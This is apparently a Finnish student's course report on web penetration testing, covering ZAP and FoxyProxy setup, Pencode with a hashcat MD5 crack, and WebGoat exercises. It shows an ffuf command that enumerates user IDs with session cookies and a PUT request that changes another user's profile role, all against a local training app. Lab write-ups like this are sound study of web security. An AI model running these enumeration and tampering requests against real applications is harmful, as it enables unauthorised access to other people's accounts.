# Johdanto

VIikon tehtävänä on harjaantua WEBBIpalvelu hyökkäyksissä ja tutustua ZAP proxy palvelimen käyttöön. Viikon tehtävissä käytetään vain sallittuja maaleja.

x)

## a) Asenna ZAP, generoi CA sertifikaatti ja asenna se selaimeen

Ensimmäisen tehtävän suoritin jo tunnin aikana mutta tunnin aikana en tehnyt muistiinpanoa tai laatinut raporttia.

ZAP proxy palvelimen asentaminen voidaan toteuttaa suoraan Kalin virallisesta reposta:

    ┌──(kynaniska㉿kynaniska)-[~]
    └─$ sudo apt-get install zaproxy
![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/23639faa-9616-49e2-8e61-75e3f62a7847)

Käynistin ZAP proxyn joka kestää noin minuuttin. ZAP toimii minulla portissa 8081. Vaihdoin oletus portin 8080 toiseen koska käytin foxyproxya aikasemmin.
Kuvankaappauksesta näkyy että ZAP alkaa seurata kaikkea liikenettä mitä firefox selaimessa tapahtuu. Kuvassa menin sivulle `google.com`. 

Käytän google.com esimerkkinä koska en tee aktiivisia toimia sitä vastaan. Jos haluaisin tehdä aktiivisia toimia minun pitäisi käyttää hyväksyttyä kohdetta kuten `webgoat`.

ZAP luo automaattisesti "Väärenetyn" sertifikaatin. Sen saa esille ZAP valikosta `tools/preferences/network/Server sertificates`.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/f24659f6-5bcf-473b-8b11-74a965495ac6)

Sertifikaatin voi asentaa selaimelle valikosta `setting/Security/Certificates` 

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/d4545055-f08d-4d2a-b4f5-51a51de883d6)

Kuvankaappauksesta näkyy generoimani sertifikaatti. `ZAP Attack Proxy ROOT CA`.

Jotta saan ZAP analyysissä kuvat näkyviin ne pitää laittaa päälle asetuksista. Ne eivät ole vakiona päällä.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/4c893e81-423d-4a84-a40a-3197f8019029)

Nyt on ZAP valmiina hyökkäyksiä varten!!

## b)Foxyproxy ja sen käyttö

FoxyProxy on mozilla firefoxiin asennettava lisäosa. Lisäosa toimii proxyna ja mahdollistaa localhost liikenteen reitittyvän ZAP palvelimelle.

Foxyproxy on saatavilla sivulla: https://getfoxyproxy.org/

Foxyproxy on käytännössä tässä tapauksessa proxyn proxy. Eli kun koneeni ottaa yhteyttä esim. google.com sen hakupyynnöt ohjautuvat ensiksi foxyproxyyn ja sen jälkeen ZAP proxyyn.

Asetukseni näyttävät seuraavalta:

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/83a28371-4ae5-4d82-95d4-878a0de5c88c)



Jotta ZAP ei vahingossakaan sieppaisi liikennettä tai hyökkäisi kohteisiin jota en haluaisi niin käytän Pattern asetuksia. Pattern mahdollistaa sen että FoxyProxy ohjaa vain tietyn sivuston liikenteen ZAP palvelimelle. Tämän viikon harjoituksissa tulemme käyttämään `localhost` sekä `portswigger.com` sivustoja.

Foxyproxy lisäosasta pitää vielä valita `Proxy by pattern`

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/d7e60124-f8d4-47f4-95c8-15ff44434013)

Kokeilen tätä menemällä `portswigger.com` sivustolle selaimella jonka jälkeen menen ZAP valikkoon tarkastamaan tulosta.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/daca3ee4-3bf2-491a-805a-9c7c9b0294df)

Kun menen google.com niin ZAP ohjelmaan ei ilmesty mitää liikenettä.


## k) Webgoat 2023.4

Aikaisemmissa tehtävissä olin jo asentanut Webgoatin. 

Asennustiedostot löytyvät: https://github.com/WebGoat/WebGoat/releases/download/v2023.4/webgoat-2023.4.jar

Asennus tapahtuu komennoilla.

        wget https://github.com/WebGoat/WebGoat/releases/download/v2023.4/webgoat-2023.4.jar
        java -jar webgoat-2023.4 jar.
## i) Pencode

Tehtävänä on asentaa Pencode. Pencode on ´saatavilla Githubista: https://github.com/ffuf/pencode/tree/master.
Pencoden kehittäjä on Joohoi joka on myös kehittänyt FFuF jota aikasemmin käytimme kurssilla.

Pencode on myös saatavilla Kalin virallisessa repossa:

        sudo apt install golang-github-ffuf-pencode-dev
        Do you want to install it? (N/y)N

Pencode avulla on mahdollista koodata tekstiä haluttuun muotoon kuten UTF8, UTF16 jne. Sillä voi myös koodata tekstiä tiivisteiksi kuten SHA256 ja MD5.

        ┌──(kynaniska㉿kynaniska)-[~/pencode]
        └─$ echo 'hello world' | pencode md5   ## Koodaa hello world MD5 tiivisteeksi     
        5eb63bbbe01eeed093cb22bb8f5acdc3 ##MD5 tiiviste

Kokeilen vielä hashcatilla avata tiivisteen.

        ┌──(kynaniska㉿kynaniska)-[~/pencode]
        └─$ hashcat -m 0 testi /usr/share/wordlists/rockyou.txt
        5eb63bbbe01eeed093cb22bb8f5acdc3:hello world  

Voin todeta että `Pencode` toimii!


# WebGoat Tehtävät

## (A1) Broken Access Control

**Hijack a session** (1). Tehtävänä on siepata sessioni. Olen täysin hukassa alussa. Kuitenkin Webgoat vinkissä on että tarkasta keksi `hijack_cookie` on mielenkiintoinen keksi ja sen formaatti pitäisi kiinnostaa meitä.

Keksi näyttää seuraavalta:

        hijack_cookie=4206604424165878483-1714749083288

Webgoat vinkeistä saan neuvon että kokeile lähettää "väärenetyn keksin`. Kokeilen sitä ZAP:lla. Mutta tämä ei tuota tulosta.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/03b24c76-c485-4f01-8bf9-49a387b409c3)

Muutan keksin arvon:

        hijack_cookie=1-1714749083288

Mutta tämä ei tee mitään.

Löysin hyödyllisen blogipostauksen: https://olleb.com/OWASP-WebGoat-hijack-session/. Mutta valitettavasti se ei hyödytä minua tässä ongelmassa.

Ymmärrän että minun on tarkoitus siepata keksi joka koostuu kahdesta osasta: Juokseva numero ja "unix epoch time". Jälkimmäinen osa on sekuntit jotka on kulunut 1.1.1970 asti. Mutta outoa että minun ympäristössä tämä arvo ei muutu.

Tulen siihen lopputulokseen että en saa tätä tehtävää suoritettua.

**Insecure Direct Object References**

Sieppaan pyynnön Tom Cat profiilista kohdassa 4.

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/11c675d1-1bbe-49e6-bf23-838a2159f6e5)

Ylläoleva pyntö kohdistuu URL: webgoat/IDOR/profile. Mutta en vaan millään ymmärrä miten saan selville "oman" profiilin tiedot.


Kokeilen myös lisäämällä `Tom Cat` käyttäjän käyttäjäid URL perään:

        webgoat/IDOR/profile/2342384

Ja tässä vaiheessa tajusin että URL pitää kirjoittaa oikeilla isoilla kirjaimilla. Eli vastaus oli:

        WebGoat/IDOR/profile/2342384

**Toisen käyttäjän tietojen muokkaaminen**

Tehtävänä on löytää ja muokata toisen käyttäjän tietoja. Tätä tehtävää en olisi voinut ratkaista ilman apuja.

Löysin hyvän ohjeen: https://pvxs.medium.com/webgoat-idor-5-f3b0beba931 jossa selitetään mitä pitäisi tehdä.

Eli käyttäjää voisi FUZZATA. Ja tämänhän minä osaan!!

Luon ensin tiedoston missä on lista numeroista 000-999.

        seq -f "%03g" 000 999 > numbers.txt

Jonka jälkeen käytän fuffia kohdetta vastaan:

        ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ ffuf -c -w numbers.txt \
    -u http://localhost:8080/WebGoat/IDOR/profile/2342FUZZ \ ##Fuzzauksen kohde
    -H "Host: localhost:8080" \ ##Host. En ole ihan varma onko tämä pakollinen
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Accept-Encoding: gzip, deflate" \
    -H "Cookie: JSESSIONID=f9yNiTRQ62ypFLClEtjFufjYU8ZYQTBDw6bmECyj; hijack_cookie=4206604424165878483-1714749083288" \ ##Sessionin keksi
    -mc 200 -t 1

Vastauksena saan kaksi käyttäjää:
    
    384                     [Status: 200, Size: 250, Words: 40, Lines: 7, Duration: 37ms]
    388                     [Status: 200, Size: 245, Words: 32, Lines: 7, Duration: 4ms]
    :: Progress: [1000/1000] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

TOinen USERID 2342384 on aiemmin käytetty Tom Cat. Toinen on pakko olla meidän kohde.

Kokeilen tehdä GET pyynnön tälle tilille:

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/f21d29ee-dacd-4a24-9066-e6d74c339099)

Noniin sit sen arvoja pitäisi muuttaa.

Tässä vaiheessa joudun taas seuraamaan ohjeita.

Mutta lopputulos näyttää tältä.

  
    PUT http://localhost:8080/WebGoat/IDOR/profile/2342388 HTTP/1.1 ## Pakko käyttää PUT metodia koska POST ei ole sallittu
    host: localhost:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Content-Type: application/json; charset=UTF-8 ## Koska haluan syöttää JSON tiedoston tämäkin piti muuttaa.
    X-Requested-With: XMLHttpRequest
    Connection: keep-alive
    Referer: http://localhost:8080/WebGoat/start.mvc
    Cookie: JSESSIONID=f9yNiTRQ62ypFLClEtjFufjYU8ZYQTBDw6bmECyj; hijack_cookie=4206604424165878483-1714749083288
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    content-length: 106
    
    
    {
      "role" : 1,
      "color" : "red",
      "size" : "large",
      "name" : "Buffalo Bill",
      "userId" : "2342388"
        }    

Tätä tehtävää tehdessä nojauduin vahvasti ohjeisiin. Muutoin en olisi selvinnyt millään tästä.


        





